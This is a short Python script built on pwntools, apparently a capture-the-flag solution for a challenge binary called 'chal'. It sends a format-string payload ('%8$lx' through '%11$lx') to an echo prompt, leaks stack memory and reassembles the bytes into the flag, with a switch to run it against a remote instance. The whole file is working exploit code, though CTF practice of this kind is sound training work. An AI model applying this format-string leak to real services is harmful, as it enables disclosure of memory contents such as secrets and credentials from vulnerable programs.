from pwn import *
#from config import REMOTE_ADDR, REMOTE_PORT

REMOTE = 0 # Change to 1 to run the exploit on the remote instance

e = context.binary = ELF("./chal")

if REMOTE:
    p = remote(REMOTE_ADDR, REMOTE_PORT)
else:
    p = e.process()

io = r = p # use whichever you like for communication

def echo(text):
    p.sendlineafter(b"[EAAS]> ", text)
    return p.recvline().decode().strip();

res = echo("%8$lx %9$lx %10$lx %11$lx").split(" ")
arr = bytearray()
for i in range(0, 3):
    x = res[i]
    arr += bytes.fromhex(x)[::-1]

# Flag has a new line
arr += bytes.fromhex(res[3][1:])[::-1]
print(arr)
